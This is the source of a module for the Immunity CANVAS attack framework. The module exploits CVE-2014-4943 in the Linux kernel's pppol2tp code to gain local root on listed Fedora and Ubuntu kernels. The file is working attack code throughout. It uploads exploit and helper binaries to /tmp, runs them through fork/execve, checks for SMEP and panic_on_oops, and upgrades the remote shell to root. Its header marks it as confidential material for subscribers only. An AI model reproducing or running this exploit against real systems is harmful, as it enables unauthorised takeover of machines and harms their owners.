#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
import os
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from linuxNode import linuxNode

NAME                            = 'pppol2tp local root'
DESCRIPTION                     = 'Elevate MOSDEF Node privileges through CVE-2014-4943'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'GNU/Linux'
DOCUMENTATION['Repeatability']  = 'Single'
DOCUMENTATION['CVE Name']       = 'CVE-2014-4943'
DOCUMENTATION['CVE Url']        = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4943'

VERSION                         = '2.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [['Linux', 'x86', 'x64']]

DOCUMENTATION['Notes'] = """

Exploit for Linux >= 3.4.x (amd64) and >= 3.7.x (x86)

Tested on
	+ Ubuntu 13.04 / 13.10 / 14.04 (x86/amd64)
	+ Fedora 17 (amd64 only)
	+ Fedora 18/19/20 (x86/amd64)

Note: Debian is _not_ supported.

[+] Exhaustive list of supported kernels (AMD64):
	-> [0] 3.14.5-200.fc20.x86_64 - Fedora 20.00
	-> [1] 3.13.5-200.fc20.x86_64 - Fedora 20.00
	-> [2] 3.12.10-300.fc20.x86_64 - Fedora 20.00
	-> [3] 3.11.10-301.fc20.x86_64 - Fedora 20.00
	-> [4] 3.14.5-100.fc19.x86_64 - Fedora 19.00
	-> [5] 3.12.9-200.fc19.x86_64 - Fedora 19.00
	-> [6] 3.11.6-200.fc19.x86_64 - Fedora 19.00
	-> [7] 3.10.7-200.fc19.x86_64 - Fedora 19.00
	-> [8] 3.9.5-301.fc19.x86_64 - Fedora 19.00
	-> [9] 3.11.10-100.fc18.x86_64 - Fedora 18.00
	-> [10] 3.9.6-200.fc18.x86_64 - Fedora 18.00
	-> [11] 3.7.9-205.fc18.x86_64 - Fedora 18.00
	-> [12] 3.6.10-4.fc18.x86_64 - Fedora 18.00
	-> [13] 3.9.10-100.fc17.x86_64 - Fedora 17.00
	-> [14] 3.13.0-30-generic - Ubuntu 14.04
	-> [15] 3.13.0-29-generic - Ubuntu 14.04
	-> [16] 3.13.0-27-generic - Ubuntu 14.04
	-> [17] 3.13.0-24-generic - Ubuntu 14.04
	-> [18] 3.11.0-24-generic - Ubuntu 13.10
	-> [19] 3.11.0-23-generic - Ubuntu 13.10
	-> [20] 3.11.0-12-generic - Ubuntu 13.10
	-> [21] 3.8.0-19-generic - Ubuntu 13.04
[+] Exhaustive list of supported kernels (x86):
	-> [0] 3.15.4-200.fc20.i686 - Fedora 20.00
	-> [1] 3.14.9-200.fc20.i686 - Fedora 20.00
	-> [2] 3.13.7-200.fc20.i686 - Fedora 20.00
	-> [3] 3.12.10-300.fc20.i686 - Fedora 20.00
	-> [4] 3.11.10-301.fc20.i686 - Fedora 20.00
	-> [5] 3.14.9-100.fc19.i686 - Fedora 19.00
	-> [6] 3.14.8-100.fc19.i686 - Fedora 19.00
	-> [7] 3.13.11-100.fc19.i686 - Fedora 19.00
	-> [8] 3.12.9-200.fc19.i686 - Fedora 19.00
	-> [9] 3.9.5-301.fc19.i686 - Fedora 19.00
	-> [10] 3.11.10-100.fc18.i686 - Fedora 18.00
	-> [11] 3.10.10-100.fc18.i686 - Fedora 18.00
	-> [12] 3.8.11-200.fc18.i686 - Fedora 18.00
	-> [13] 3.7.9-201.fc18.i686 - Fedora 18.00
	-> [14] 3.6.0-3.fc18.i686 - Fedora 18.00
	-> [15] 3.13.0-30-generic - Ubuntu 14.04
	-> [16] 3.13.0-29-generic - Ubuntu 14.04
	-> [17] 3.13.0-27-generic - Ubuntu 14.04
	-> [18] 3.13.0-24-generic - Ubuntu 14.04
	-> [19] 3.11.0-24-generic - Ubuntu 13.10
	-> [20] 3.11.0-23-generic - Ubuntu 13.10
	-> [21] 3.11.0-19-generic - Ubuntu 13.10
	-> [22] 3.11.0-12-generic - Ubuntu 13.10
	-> [23] 3.8.0-19-generic - Ubuntu 13.04
"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_exp      = os.path.join(self.local_res, 'x')
        self.remote_exp     = '/tmp/x'
        self.remote_helper  = '/tmp/h'

    def cleanup(self):
        self.log('[+] Cleaning up')
        self.node.runcommand('rm -f %s %s' % (self.remote_exp, self.remote_helper))

    def fork_and_exec(self, command, unsafe = 0, wait = 0):
        lvars            = {}
        lvars['COMMAND'] = command
        if unsafe==1:
            lvars['ARG1']  = '-unsafe'
        else:
            lvars['ARG1']  = 'whatever'
        lvars['MOSDEF']  = '%d' % self.node.shell.fd
        lvars['WAIT']    = wait

        code = """
        #import "string", "COMMAND" as "COMMAND"
        """

        if command != self.remote_exp:
            code += """
        #import "string", "MOSDEF"  as "ARG1"
        """
        else:
            code += """
        #import "string", "ARG1" as "ARG1"
        """

        code += """
        #import "int",    "WAIT"    as "WAIT"

        #import "local", "fork"    as "fork"
        #import "local", "execve"  as "execve"
        #import "local", "exit"    as "exit"
        #import "local", "sendint" as "sendint"
        #import "local", "waitpid" as "waitpid"

        void main()
        {
            char *argv[3];
            char **envp;
            int pid;

            envp = NULL;
            argv[0] = COMMAND;
            argv[1] = ARG1;
            argv[2] = NULL;

            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, envp);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """

        ret = self.node.shell.runCode(code, lvars)
        return ret

    def run(self):
        self.node = self.argsDict['passednodes'][0]
        if self.node.shell is None:
            self.log("[EE] Node has no shell server available")
            self.log("[EE] Bailing")
            return 0

        if isinstance(self.node, linuxNode):
            if self.node.proctype not in [ 'i386', 'x64' ]:
                self.log('[EE] Node of type (%s) proctype (%s) is not supported' % (self.node.nodetype, self.node.proctype))
                return 0

        if self.check_smep():
            self.log('[ii] Found SMEP on target host')
            self.log('[EE] Aborting')
            return False

        #
        # if panic_on_oops is enforced this exploit will likely panic
        # the remote kernel, let's avoid that
        #
        if self.panic_on_oops():
            self.log("[ii] Target node has enforced panic_on_oops setting")
            self.log("[EE] Aborting")
            return False

        if self.compromised(self.remote_helper, 0):
            self.log('[+] Already compromised')
            self.log('[+] Initing elevated MOSDEF loop')
            self.fork_and_exec(self.remote_helper, wait = 1)

            # This is required to setup the remote resolver on 64 bits
            # platforms.
            self.init_mosdef_upgrade()

            return True

        self.log('[+] Uploading helper and exploit')
        if self.node.proctype == 'i386':
            self.local_exp += '32'
            local_helper = self.local_helper_32
        else:
            self.local_exp += '64'
            local_helper = self.local_helper_64
        if self.nodeUpload(self.local_exp, self.remote_exp) == False:
            return False
        if self.nodeUpload(local_helper, self.remote_helper) == False:
            return False

        if self.version == 1:
            self.log('[+] Executing exploit (unsafe mode)')
            self.fork_and_exec(self.remote_exp, unsafe=1)
        else:
            self.log('[+] Executing exploit (safe mode)')
            self.fork_and_exec(self.remote_exp, unsafe=0)
        self.log('[+] Waiting...')

        # wait 10 secs for the exploit to complete
        wait_secs = 10
        if self.compromised(self.remote_helper, wait_secs):
            self.log('[+] Compromised!')
            self.log('[+] Upgrading MOSDEF connection loop')
            self.fork_and_exec(self.remote_helper, wait = 1)

            # This is required to setup the remote resolver on 64 bits
            # platforms.
            self.init_mosdef_upgrade()

            self.cleanup()
            self.log('[+] Done')
        else:
            self.log('[EE] Looks like we failed, try again!')

            self.cleanup()
            return False

        return True


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
